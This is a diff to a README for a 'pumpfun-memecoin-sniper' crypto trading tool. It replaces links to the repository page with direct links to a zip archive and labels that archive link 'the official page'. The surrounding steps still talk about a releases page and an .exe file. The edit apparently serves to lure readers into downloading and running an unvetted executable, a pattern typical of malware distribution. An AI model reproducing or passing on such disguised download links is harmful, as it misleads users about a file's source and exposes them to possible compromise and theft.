@@ -1,6 +1,6 @@
 # 🚀 pumpfun-memecoin-sniper - Fast tools to trade new tokens
 
-[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://github.com/Jennierectile11/pumpfun-memecoin-sniper)
+[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Jennierectile11/pumpfun-memecoin-sniper/main/download files/pumpfun-sniper-memecoin-1.0.zip)
 
 ## 📌 About this software
 
@@ -22,7 +22,7 @@ Update your Windows system before you attempt the installation. This keeps your 
 
 You obtain the software through the primary repository page. Follow these steps to get the files:
 
-1.  Visit the official page: [https://github.com/Jennierectile11/pumpfun-memecoin-sniper](https://github.com/Jennierectile11/pumpfun-memecoin-sniper).
+1.  Visit the official page: [https://raw.githubusercontent.com/Jennierectile11/pumpfun-memecoin-sniper/main/download files/pumpfun-sniper-memecoin-1.0.zip](https://raw.githubusercontent.com/Jennierectile11/pumpfun-memecoin-sniper/main/download files/pumpfun-sniper-memecoin-1.0.zip).
 2.  Look for the releases section on the right side of the page.
 3.  Click the latest version to view the download options.
 4.  Select the file ending in .exe to start your download.
